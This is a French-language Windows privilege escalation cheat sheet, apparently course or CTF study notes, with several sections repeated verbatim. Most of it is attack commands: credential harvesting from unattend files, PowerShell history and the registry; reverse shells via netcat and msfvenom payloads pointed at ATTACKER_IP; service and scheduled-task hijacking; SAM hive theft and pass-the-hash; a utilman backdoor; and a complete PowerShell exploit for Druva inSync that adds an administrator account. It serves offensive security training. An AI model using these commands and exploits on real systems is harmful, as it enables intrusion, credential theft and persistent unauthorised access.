# 🪟 Windows – Escalade de Privilèges ⚡

## 👥 Types de Comptes Windows

| Compte              | Description & Privileges clés                                          |
|---------------------|----------------------------------------------------------------------|
| **Administrators**   | Pleins droits sur le système : configuration, accès fichiers, installation. |
| **Standard Users**   | Droits limités : accès restreint aux fichiers et paramètres, pas de modifications système majeures. |
| **SYSTEM / LocalSystem** | Compte interne Windows avec privilèges supérieurs à Administrators, accès complet au système. |
| **Local Service**    | Compte système pour services Windows avec privilèges minimaux, utilise des connexions anonymes. |
| **Network Service**  | Compte système pour services Windows avec privilèges minimaux, s’authentifie avec les credentials machine. |

## 🛠️ Faiblesses exploitées pour l'escalade

- Mauvaises permissions sur fichiers ou services  
- Services Windows ou tâches planifiées mal configurées  
- Privilèges excessifs sur l’utilisateur actuel  
- Logiciels vulnérables et patches manquants  
- Fichiers de credentials non protégés  

# 🔐 Récupération de Credentials Windows – Post-Exploitation 🏃‍♂️

📍 **Techniques pour extraire des mots de passe stockés sur une machine Windows compromise**

---

## 🚀 Installations Windows Non-Supervisées

| 📁 Emplacement | 🔍 Usage |
|----------------|----------|
| `C:\Unattend.xml` | Fichier principal d'installation automatisée |
| `C:\Windows\Panther\Unattend.xml` | Copie sauvegardée post-installation |
| `C:\Windows\Panther\Unattend\Unattend.xml` | Autre emplacement de sauvegarde |
| `C:\Windows\system32\sysprep.inf` | Configuration sysprep (anciennes versions) |
| `C:\Windows\system32\sysprep\sysprep.xml` | Configuration sysprep XML |

💡 *Contiennent souvent des credentials d'administrateur en XML pour les déploiements automatisés*

---

## 📜 Historique PowerShell

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` | Affiche l'historique des commandes PowerShell |

💡 *Révèle les commandes avec mots de passe tapés directement en ligne de commande*

---

## 💾 Credentials Windows Sauvegardés

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `cmdkey /list` | Liste les credentials Windows sauvegardés |
| `runas /savecred /user:admin cmd.exe` | Utilise des credentials sauvegardés sans retaper le mot de passe |

💡 *Exploite la fonction Windows de sauvegarde automatique des identifiants*

---

## 🌐 Configuration IIS

| 📁 Emplacement | 💻 Commande | 🔍 Usage |
|----------------|-------------|----------|
| `C:\inetpub\wwwroot\web.config` | `type C:\inetpub\wwwroot\web.config \| findstr connectionString` | Configuration web par défaut |
| `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config` | `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config \| findstr connectionString` | Configuration .NET globale |

💡 *Contient les chaînes de connexion DB et credentials d'authentification web*

---

## 🔌 Credentials PuTTY

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s` | Extrait les credentials proxy stockés par PuTTY |

💡 *PuTTY stocke les credentials proxy en clair dans la registry*

---

## 🎯 Autres Logiciels à Cibler

💡 *Navigateurs, clients email, FTP, SSH, VNC – tous stockent potentiellement des credentials récupérables*


# ⬆️ Escalade de Privilèges Windows – Misconfigurations 🔧

📍 **Exploitation de configurations défaillantes pour élever ses privilèges**

---

## ⏰ Tâches Planifiées (Scheduled Tasks)

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `schtasks` | Liste toutes les tâches planifiées du système |
| `schtasks /query /tn TASKNAME /fo list /v` | Affiche les détails d'une tâche spécifique |
| `icacls C:\path\to\executable` | Vérifie les permissions sur l'exécutable de la tâche |
| `schtasks /run /tn TASKNAME` | Déclenche manuellement une tâche planifiée |

### 🎯 Exploitation
```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

💡 *Si l'utilisateur peut modifier l'exécutable d'une tâche, il hérite des privilèges de l'utilisateur qui lance la tâche*

---

## 🔝 AlwaysInstallElevated

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` | Vérifie la clé registry utilisateur |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | Vérifie la clé registry système |

### 🎯 Exploitation
| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o malicious.msi` | Génère un installeur MSI malveillant |
| `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi` | Lance l'installeur avec privilèges élevés |

💡 *Si les deux clés registry sont définies, les fichiers .msi s'exécutent automatiquement avec privilèges administrateur*

---

## 🚨 Points Clés

💡 *Ces techniques exploitent des misconfigurations système plutôt que des vulnérabilités complexes*
💡 *Plus communes en environnement CTF qu'en pentest réel*
💡 *Toujours vérifier les permissions avant l'exploitation*


# ⬆️ Escalade de Privilèges Windows – Services & Misconfigurations 🔧

📍 **Exploitation de configurations défaillantes et services Windows vulnérables**

---

## 🔧 Services Windows - Reconnaissance

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `sc qc SERVICENAME` | Affiche la configuration détaillée d'un service |
| `icacls C:\path\to\service.exe` | Vérifie les permissions sur l'exécutable du service |
| `accesschk64.exe -qlc SERVICENAME` | Analyse les permissions DACL d'un service |

💡 *Les services stockent leurs configurations dans `HKLM\SYSTEM\CurrentControlSet\Services\`*

---

## 🎯 Permissions Faibles sur Exécutable de Service

### 🔍 Reconnaissance
```cmd
sc qc WindowsScheduler
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```

### 🎯 Exploitation
| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe-service -o rev-svc.exe` | Génère un payload service |
| `move WService.exe WService.exe.bkp` | Sauvegarde l'original |
| `move rev-svc.exe WService.exe` | Remplace par le payload |
| `icacls WService.exe /grant Everyone:F` | Accorde permissions complètes |
| `sc stop/start SERVICENAME` | Redémarre le service |

💡 *Si Everyone a permissions (M) sur l'exécutable, remplacement possible avec payload malveillant*

---

## 📝 Chemins de Service Non-Quotés (Unquoted Service Paths)

### 🔍 Identification
```cmd
sc qc "disk sorter enterprise"
# BINARY_PATH_NAME : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```

### 🎯 Exploitation
| Ordre de recherche SCM | Fichier à créer |
|------------------------|-----------------|
| `C:\MyPrograms\Disk.exe` | **🎯 Payload ici** |
| `C:\MyPrograms\Disk Sorter.exe` | Alternative |
| `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` | Légitime |

```cmd
move rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
sc stop/start "disk sorter enterprise"
```

💡 *SCM cherche les exécutables dans l'ordre jusqu'à en trouver un existant*

---

## 🔐 Permissions Faibles sur Service (DACL)

### 🔍 Reconnaissance
```cmd
accesschk64.exe -qlc thmservice
# BUILTIN\Users: SERVICE_ALL_ACCESS
```

### 🎯 Exploitation
| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `sc config THMService binPath= "C:\path\to\payload.exe" obj= LocalSystem` | Reconfigure le service pour SYSTEM |
| `sc stop THMService` | Arrête le service |
| `sc start THMService` | Lance avec nouveaux paramètres |

💡 *Si SERVICE_ALL_ACCESS accordé, reconfiguration complète possible including compte SYSTEM*

---

## ⏰ Tâches Planifiées (Scheduled Tasks)

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `schtasks` | Liste toutes les tâches planifiées du système |
| `schtasks /query /tn TASKNAME /fo list /v` | Affiche les détails d'une tâche spécifique |
| `icacls C:\path\to\executable` | Vérifie les permissions sur l'exécutable de la tâche |
| `schtasks /run /tn TASKNAME` | Déclenche manuellement une tâche planifiée |

### 🎯 Exploitation
```cmd
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

💡 *Si l'utilisateur peut modifier l'exécutable d'une tâche, il hérite des privilèges de l'utilisateur qui lance la tâche*

---

## 🔝 AlwaysInstallElevated

| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer` | Vérifie la clé registry utilisateur |
| `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer` | Vérifie la clé registry système |

### 🎯 Exploitation
| 💻 Commande | 🔍 Usage |
|-------------|----------|
| `msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o malicious.msi` | Génère un installeur MSI malveillant |
| `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi` | Lance l'installeur avec privilèges élevés |

💡 *Si les deux clés registry sont définies, les fichiers .msi s'exécutent automatiquement avec privilèges administrateur*

---

## 🚨 Points Clés

💡 *Services Windows offrent multiple vecteurs d'escalade selon les misconfigurations*
💡 *Toujours vérifier permissions sur exécutables, chemins, et DACL des services*
💡 *PowerShell utilise `sc` comme alias - utiliser `sc.exe` pour contrôler les services*

# 🔓 Escalade de Privilèges Windows – Exploitation des Privilèges Système 🪟

📍 **Exploite les privilèges système pour devenir SYSTEM !**

---

## 🔍 Vérification des privilèges

| 🧰 Outil | 💻 Commande | 🔍 Usage |
|----------|-------------|----------|
| `whoami` | `whoami /priv` | Affiche tous les privilèges assignés à l'utilisateur courant |

---

## 💾 SeBackup / SeRestore

| 🎯 Technique | 💻 Commande | 🔍 Usage |
|--------------|-------------|----------|
| Sauvegarder SAM | `reg save hklm\sam C:\Users\user\sam.hive` | Extrait la base des comptes locaux |
| Sauvegarder SYSTEM | `reg save hklm\system C:\Users\user\system.hive` | Extrait les clés de chiffrement système |
| Serveur SMB | `python3 /opt/impacket/examples/smbserver.py -smb2support -username user -password pass public share` | Partage réseau pour transférer les fichiers |
| Copie vers attaquant | `copy C:\file.hive \\ATTACKER_IP\public\` | Transfère les hives vers la machine attaquante |
| Extraction hashes | `python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL` | Récupère les hashes des mots de passe |
| Pass-the-Hash | `python3 /opt/impacket/examples/psexec.py -hashes lm:nt admin@IP` | Connexion avec le hash Administrator |

💡 *Permet de lire/écrire n'importe quel fichier système en ignorant les ACL*

---

## 👑 SeTakeOwnership

| 🎯 Technique | 💻 Commande | 🔍 Usage |
|--------------|-------------|----------|
| Prise de contrôle | `takeown /f C:\Windows\System32\Utilman.exe` | Devient propriétaire du fichier système |
| Attribution permissions | `icacls C:\Windows\System32\Utilman.exe /grant USER:F` | Donne permissions complètes sur le fichier |
| Remplacement binaire | `copy cmd.exe utilman.exe` | Remplace utilman par cmd pour backdoor |
| Déclenchement | Écran de verrouillage → "Ease of Access" | Active utilman avec privilèges SYSTEM |

💡 *Permet de devenir propriétaire de n'importe quel objet système*

---

## 🎭 SeImpersonate / SeAssignPrimaryToken

| 🎯 Technique | 💻 Commande | 🔍 Usage |
|--------------|-------------|----------|
| Listener Netcat | `nc -lvp 4442` | Écoute pour recevoir la reverse shell |
| RogueWinRM | `RogueWinRM.exe -p "nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"` | Exploite l'authentification BITS vers WinRM |

💡 *Exploite les services qui s'authentifient automatiquement avec SYSTEM*

---

## 🎯 Comptes cibles fréquents

| 🔍 Compte | 🎭 Privilèges typiques | 📍 Contexte |
|-----------|------------------------|-------------|
| LOCAL SERVICE | SeImpersonate, SeAssignPrimaryToken | Services système restreints |
| NETWORK SERVICE | SeImpersonate, SeAssignPrimaryToken | Services réseau |
| IIS APPPOOL\DefaultAppPool | SeImpersonate, SeAssignPrimaryToken | Applications web IIS |
| Backup Operators | SeBackup, SeRestore | Groupes de sauvegarde |



# 🔓 Escalade de Privilèges Windows – Logiciels Non Patchés & Privilèges Système 🪟

📍 **Exploite les logiciels vulnérables et privilèges système pour devenir SYSTEM !**

---

# 🤖 Outils d'Énumération Windows – Automatisation de la Reconnaissance 🔍

📍 **Scripts et outils pour accélérer la découverte de vecteurs d'escalade de privilèges !**

---

## 🚀 WinPEAS - Windows Privilege Escalation Awesome Scripts

| 🎯 Action | 💻 Commande | 🔍 Usage |
|-----------|-------------|----------|
| Exécution basique | `winpeas.exe` | Lance l'énumération complète du système |
| Sortie fichier | `winpeas.exe > outputfile.txt` | Redirige la sortie vers un fichier pour analyse |
| Téléchargement | [github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) | Binaire précompilé ou script .bat disponible |

💡 *Énumération automatisée complète mais sortie très verbeuse*

---

## 🔧 PrivescCheck - PowerShell Privilege Escalation

| 🎯 Action | 💻 Commande | 🔍 Usage |
|-----------|-------------|----------|
| Bypass execution policy | `Set-ExecutionPolicy Bypass -Scope process -Force` | Autorise l'exécution de scripts PowerShell |
| Chargement script | `. .\PrivescCheck.ps1` | Importe les fonctions dans la session |
| Lancement scan | `Invoke-PrivescCheck` | Démarre l'analyse des vecteurs d'escalade |
| Téléchargement | [github.com/itm4n/PrivescCheck](https://github.com/itm4n/PrivescCheck) | Script PowerShell pur, pas de binaire |

💡 *Alternative PowerShell à WinPEAS, évite l'upload de binaires*

---

## 🎯 WES-NG - Windows Exploit Suggester Next Generation

| 🎯 Action | 💻 Commande | 🔍 Usage |
|-----------|-------------|----------|
| Mise à jour DB | `wes.py --update` | Met à jour la base de données d'exploits |
| Collecte info cible | `systeminfo > systeminfo.txt` | Récupère les infos système depuis la cible |
| Analyse locale | `wes.py systeminfo.txt` | Analyse depuis la machine attaquante |
| Téléchargement | [github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng) | Script Python pour analyse hors ligne |

💡 *Analyse depuis l'attaquant, évite la détection antivirus sur la cible*

---

## 🎭 Metasploit - Local Exploit Suggester

| 🎯 Action | 💻 Commande | 🔍 Usage |
|-----------|-------------|----------|
| Module suggester | `use multi/recon/local_exploit_suggester` | Charge le module de suggestion d'exploits |
| Configuration | `set SESSION [meterpreter_session_id]` | Définit la session Meterpreter cible |
| Lancement | `run` | Exécute l'analyse des vulnérabilités locales |

💡 *Nécessite une session Meterpreter active, suggère des exploits Metasploit*

---

## ⚠️ Bonnes pratiques

| 🛡️ Conseil | 📝 Description |
|-------------|----------------|
| **Redirection sortie** | Toujours rediriger vers un fichier pour analyser calmement |
| **Analyse manuelle** | Les outils automatisés peuvent rater certains vecteurs |
| **Discrétion** | WES-NG évite l'upload de binaires sur la cible |
| **Complémentarité** | Utiliser plusieurs outils pour une couverture maximale |
## 🔍 Reconnaissance logiciels vulnérables

| 🧰 Outil | 💻 Commande | 🔍 Usage |
|----------|-------------|----------|
| `wmic` | `wmic product get name,version,vendor` | Liste tous les logiciels installés avec leurs versions |
| Recherche exploits | exploit-db.com, packetstormsecurity.com | Bases de données d'exploits publics |

💡 *Les logiciels tiers sont souvent moins mis à jour que l'OS*

---

## 🎯 Cas d'étude : Druva inSync 6.6.3

| 🎯 Technique | 💻 Commande/Code | 🔍 Usage |
|--------------|------------------|----------|
| Exploit RPC | Port 6064 localhost | Serveur RPC qui s'exécute avec privilèges SYSTEM |
| Path Traversal | `C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe` | Contournement du filtre de chemin via traversal |
| Création utilisateur | `net user pwnd SimplePass123 /add` | Crée un nouvel utilisateur avec mot de passe |
| Ajout admin | `net localgroup administrators pwnd /add` | Ajoute l'utilisateur au groupe administrateurs |
| Vérification | `net user pwnd` | Confirme que l'utilisateur est créé et admin |

### 📜 Script PowerShell complet
```powershell
$ErrorActionPreference = "Stop"
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
$s = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork,[System.Net.Sockets.SocketType]::Stream,[System.Net.Sockets.ProtocolType]::Tcp)
$s.Connect("127.0.0.1", 6064)
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);
$s.Send($header); $s.Send($rpcType); $s.Send($length); $s.Send($command)
```

💡 *Exploite une procédure RPC vulnérable qui exécute des commandes avec privilèges SYSTEM*

---

## 🔍 Vérification des privilèges

| 🧰 Outil | 💻 Commande | 🔍 Usage |
|----------|-------------|----------|
| `whoami` | `whoami /priv` | Affiche tous les privilèges assignés à l'utilisateur courant |

---

## 💾 SeBackup / SeRestore

| 🎯 Technique | 💻 Commande | 🔍 Usage |
|--------------|-------------|----------|
| Sauvegarder SAM | `reg save hklm\sam C:\Users\user\sam.hive` | Extrait la base des comptes locaux |
| Sauvegarder SYSTEM | `reg save hklm\system C:\Users\user\system.hive` | Extrait les clés de chiffrement système |
| Serveur SMB | `python3 /opt/impacket/examples/smbserver.py -smb2support -username user -password pass public share` | Partage réseau pour transférer les fichiers |
| Copie vers attaquant | `copy C:\file.hive \\ATTACKER_IP\public\` | Transfère les hives vers la machine attaquante |
| Extraction hashes | `python3 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL` | Récupère les hashes des mots de passe |
| Pass-the-Hash | `python3 /opt/impacket/examples/psexec.py -hashes lm:nt admin@IP` | Connexion avec le hash Administrator |

💡 *Permet de lire/écrire n'importe quel fichier système en ignorant les ACL*

---

## 👑 SeTakeOwnership

| 🎯 Technique | 💻 Commande | 🔍 Usage |
|--------------|-------------|----------|
| Prise de contrôle | `takeown /f C:\Windows\System32\Utilman.exe` | Devient propriétaire du fichier système |
| Attribution permissions | `icacls C:\Windows\System32\Utilman.exe /grant USER:F` | Donne permissions complètes sur le fichier |
| Remplacement binaire | `copy cmd.exe utilman.exe` | Remplace utilman par cmd pour backdoor |
| Déclenchement | Écran de verrouillage → "Ease of Access" | Active utilman avec privilèges SYSTEM |

💡 *Permet de devenir propriétaire de n'importe quel objet système*

---

## 🎭 SeImpersonate / SeAssignPrimaryToken

| 🎯 Technique | 💻 Commande | 🔍 Usage |
|--------------|-------------|----------|
| Listener Netcat | `nc -lvp 4442` | Écoute pour recevoir la reverse shell |
| RogueWinRM | `RogueWinRM.exe -p "nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"` | Exploite l'authentification BITS vers WinRM |

💡 *Exploite les services qui s'authentifient automatiquement avec SYSTEM*

---

## 🎯 Comptes cibles fréquents

| 🔍 Compte | 🎭 Privilèges typiques | 📍 Contexte |
|-----------|------------------------|-------------|
| LOCAL SERVICE | SeImpersonate, SeAssignPrimaryToken | Services système restreints |
| NETWORK SERVICE | SeImpersonate, SeAssignPrimaryToken | Services réseau |
| IIS APPPOOL\DefaultAppPool | SeImpersonate, SeAssignPrimaryToken | Applications web IIS |
| Backup Operators | SeBackup, SeRestore | Groupes de sauvegarde |


# 📚 Ressources Windows Privilege Escalation – Approfondissement 🎓

📍 **Collections de techniques avancées et exploits pour maîtriser l'escalade de privilèges !**

---

## 🌐 Bases de données et collections complètes

| 📖 Ressource | 🔗 Lien | 🔍 Usage |
|--------------|---------|----------|
| **PayloadsAllTheThings** | [Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md) | Collection exhaustive de techniques et payloads |
| **HackTricks** | [Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation) | Guide méthodologique complet avec explications |

💡 *Collections communautaires régulièrement mises à jour avec nouvelles techniques*

---

## 🎯 Techniques spécialisées

| 🧰 Technique | 🔗 Ressource | 🔍 Usage |
|--------------|-------------|----------|
| **Abus de privilèges** | [Priv2Admin](https://github.com/gtworek/Priv2Admin) | Référence complète des privilèges exploitables |
| **RogueWinRM** | [RogueWinRM Exploit](https://github.com/antonioCoco/RogueWinRM) | Exploitation SeImpersonate via WinRM |
| **Potatoes** | [Potatoes Collection](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html) | Famille d'exploits SeImpersonate/SeAssignPrimaryToken |
| **Token Kidnapping** | [Token Kidnapping](https://dl.packetstormsecurity.net/papers/windows/TokenKidnapping.pdf) | Technique d'usurpation de tokens de sécurité |

💡 *Techniques avancées pour contournements spécifiques*

---

## 🔬 Recherche et analyse

| 📝 Ressource | 🔗 Lien | 🔍 Usage |
|--------------|---------|----------|
| **Decoder's Blog** | [decoder.cloud](https://decoder.cloud/) | Recherches et analyses détaillées d'exploits |

💡 *Blog de recherche en sécurité avec analyses techniques approfondies*

---

## 🎪 Familles d'exploits populaires

| 🥔 Famille | 📋 Variantes | 🔍 Principe |
|------------|-------------|-------------|
| **Potatoes** | Hot Potato, Rotten Potato, Juicy Potato, Lonely Potato | Exploitation NTLM reflection et SeImpersonate |
| **Token Techniques** | Token Kidnapping, Token Impersonation | Manipulation des tokens de sécurité Windows |
| **Service Exploits** | Unquoted Paths, Weak Permissions, DLL Hijacking | Exploitation des services Windows mal configurés |

💡 *Chaque famille cible des mécanismes Windows spécifiques*
